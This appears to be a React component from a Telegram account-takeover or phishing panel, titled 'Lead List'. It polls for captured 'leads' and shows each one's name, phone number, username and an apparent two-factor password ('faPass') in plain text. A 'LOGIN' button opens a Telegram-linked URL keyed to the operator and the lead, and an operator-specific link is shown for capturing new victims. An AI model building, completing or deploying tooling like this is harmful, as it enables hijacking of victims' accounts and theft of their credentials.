import { useEffect, useState } from "react";
import { Container, ListGroup, Button } from "react-bootstrap";
import { useSelector } from "react-redux";
import { useGetListMutation } from "../slices/usersApiSlice";
import { FaUserLock, FaIdCardAlt, FaPhone } from "react-icons/fa";
import type { lead } from "../types";

const apiUrl = import.meta.env.VITE_TELEGRAM_URL

function LeadList() {
  const { userInformation } = useSelector((state) => state.auth);
  const [leads, setLeads] = useState([]);
  const [getList, { isLoading }] = useGetListMutation();
  const [timeLeft, setTimeLeft] = useState(30);

  // Fetch leads function
  const fetchLeads = async () => {
    try {
      const fetchedLeads = await getList().unwrap();
      setLeads(fetchedLeads);
      setTimeLeft(30); // Reset timer
    } catch (error) {
      console.error("Error fetching leads:", error);
    }
  };

  useEffect(() => {
    // Fetch leads on mount and set intervals
    fetchLeads();
    const intervalId = setInterval(fetchLeads, 30000);
    const countdownId = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    // Cleanup on unmount
    return () => {
      clearInterval(intervalId);
      clearInterval(countdownId);
    };
  }, []);
  const renderLeads = () => {
    return leads.length > 0 ?
      (<ListGroup className="w-100">
        {leads.map((lead: lead, index) => (
          <ListGroup.Item
            className="mb-2 p-3 bg-white border rounded"
            key={lead._id || index}
          >
            <div className="d-flex justify-content-between align-items-center">
              <div>
                <h5 className="mb-1">{lead.fullName || "Unnamed Lead"}</h5>
                <p className="m-0 d-flex align-items-center">
                  <FaIdCardAlt />: {lead.leadId || ""}
                  <div className="vr mx-2" />
                  {lead.phone ?
                    <>
                      <FaPhone />
                      <span>
                        {formatPhoneNumber(lead.phone)}
                      </span>
                      <div className="vr mx-2" />
                    </>
                    : ""}

                  {lead.username ?
                    <>
                      <span className="text-primary">{"@" + lead.username}</span>
                      <div className="vr mx-2" />
                    </>
                    : ""
                  }

                  {lead.faPass ?
                    <>
                      <FaUserLock />
                      <span className="">{lead.faPass}</span>
                    </>
                    : ""
                  }
                  
                </p>
                <p className="m-0 text-muted">
                  Created: {formatDate(lead.createdAt)}
                </p>
                <p className="m-0 text-muted">
                  Updated: {formatDate(lead.updatedAt)}
                </p>
              </div>
              <a
                target="_blank"
                rel="noopener noreferrer"
                href={`${apiUrl}/${userInformation.uuid}%7C${lead.leadId}`}
              >
                <Button variant="primary" className="p-2">
                  LOGIN
                </Button>
              </a>
            </div>
          </ListGroup.Item>
        ))
        }
      </ListGroup >)
      : (
        <p className="text-center text-muted">No leads available.</p>
      );
  };

  const formatDate = (dateString: string) => {
    if (!dateString) return "Pending";
    return new Date(dateString).toLocaleDateString('ru-RU', {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric',
      hour: 'numeric',
      minute: 'numeric',
      second: 'numeric'
    });
  };

  function formatPhoneNumber(phone: string) {
    // Удаляем все символы, кроме цифр
    const cleaned = ('' + phone).replace(/\D/g, '');

    // Проверяем, достаточно ли цифр
    if (cleaned.length < 10) {
      return phone; // Возвращаем исходный номер, если он слишком короткий
    }
    let match = cleaned.match(/^(\d{1})(\d{3})(\d{3})(\d{4})$/);

    if (match) {
      return `+${match[1]} (${match[2]}) ${match[3]}-${match[4]}`;
    }

    return phone; // Возвращаем исходный номер, если он не подходит под формат
  }


  return (
    <div className="mx-2">
      <Container className="mx-auto d-flex flex-column align-items-center justify-content-center py-5 bg-light m-4 border border-secondary rounded shadow-sm">
        <h1 className="text-center mb-4">Lead List</h1>
        <p className="text-center mb-4">for new <span>{`${apiUrl}/${userInformation.uuid}`}</span>
        </p>
        {isLoading ?
          <h5 className="text-center mb-4">Идёт обновление</h5>
          :
          <h5 className="text-center mb-4">Next update in: {timeLeft} seconds</h5>
        }
        {renderLeads()}
      </Container>
    </div>
  );
}

export default LeadList;
